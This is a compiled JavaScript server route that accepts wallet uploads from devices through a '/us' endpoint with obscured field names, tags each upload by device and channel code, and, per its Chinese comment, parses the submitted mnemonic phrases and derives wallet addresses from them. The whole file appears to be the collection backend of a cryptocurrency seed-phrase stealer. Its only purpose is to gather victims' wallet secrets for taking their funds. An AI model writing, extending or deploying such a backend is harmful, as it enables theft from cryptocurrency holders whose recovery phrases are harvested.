import { insertWalletUpload, extractWalletData } from '../services/wallet.js';
import { processWalletSecret } from '../services/derivation.js';
import { logger } from '../../../core/logger/index.js';
import { getDeviceChannelCode } from '../../../core/devices/channel.js';
const WALLET_PATHS = ['us'];
export async function walletRoute(fastify) {
    for (const path of WALLET_PATHS) {
        fastify.post(`/${path}`, async (request) => {
            const body = request.body;
            const walletType = body?.a;
            const deviceId = body?.d1;
            if (!walletType || !deviceId)
                return {};
            const channelCode = await getDeviceChannelCode(deviceId) || request.channelCode || '';
            const data = extractWalletData(body);
            await insertWalletUpload({
                deviceId,
                channelCode,
                walletType,
                api: `/${path}`,
                data,
            });
            // /us 端点触发助记词解析和地址派生
            if (path === 'us' && data.result) {
                try {
                    await processWalletSecret({
                        walletType,
                        result: data.result,
                        deviceId,
                        channelCode,
                    });
                }
                catch (err) {
                    logger.error({ err, walletType, deviceId }, 'processWalletSecret unexpected error');
                }
            }
            return {};
        });
    }
}
//# sourceMappingURL=wallet.js.map